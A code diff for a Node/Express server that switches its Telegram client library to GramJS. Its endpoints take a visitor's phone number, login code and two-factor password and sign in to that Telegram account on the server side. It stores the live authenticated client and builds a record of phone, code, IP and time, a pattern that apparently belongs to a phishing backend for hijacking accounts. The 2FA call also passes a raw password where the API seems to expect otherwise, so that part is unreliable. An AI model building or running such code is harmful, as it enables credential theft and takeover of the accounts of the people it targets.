@@ -2,7 +2,9 @@ import express from 'express';
 import cors from 'cors';
 import fs from 'fs';
 import path from 'path';
-import { MTProto } from '@mtcute/node';
+import { TelegramClient } from 'telegram';
+import { StringSession } from 'telegram/sessions/index.js';
+import { Api } from 'telegram/tl/index.js';
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -31,25 +33,23 @@ app.post('/api/phone', async (req, res) => {
     }
 
     try {
-        const client = new MTProto({
-            apiId,
-            apiHash,
+        const client = new TelegramClient(new StringSession(''), apiId, apiHash, {
+            connectionRetries: 5,
         });
 
         await client.connect();
-
-        const result = await client.call('auth.sendCode', {
-            phone_number: phone,
-            api_id: apiId,
-            api_hash: apiHash,
-            settings: {
-                allow_flashcall: false,
-                current_number: false,
-            },
-        });
+        const result = await client.invoke(new Api.auth.SendCode({
+            phoneNumber: phone,
+            apiId: apiId,
+            apiHash: apiHash,
+            settings: new Api.CodeSettings({
+                allowFlashcall: false,
+                currentNumber: false,
+            }),
+        }));
 
         sessions.set(phone, {
-            phone_code_hash: result.phone_code_hash,
+            phone_code_hash: result.phoneCodeHash,
             client,
             timestamp: Date.now(),
         });
@@ -79,11 +79,11 @@ app.post('/api/verify', async (req, res) => {
     try {
         const { client, phone_code_hash } = session;
 
-        const result = await client.call('auth.signIn', {
-            phone_number: phone,
-            phone_code_hash,
-            phone_code: code,
-        });
+        const result = await client.invoke(new Api.auth.SignIn({
+            phoneNumber: phone,
+            phoneCodeHash: phone_code_hash,
+            phoneCode: code,
+        }));
 
         if (result.user) {
             const data = { phone, code, ip: req.ip, time: new Date().toISOString() };
@@ -118,7 +118,7 @@ app.post('/api/2fa', async (req, res) => {
 
     try {
         const { client } = session;
-        await client.call('auth.checkPassword', { password });
+        await client.invoke(new Api.auth.CheckPassword({ password: password }));
 
         const data = {
             phone,
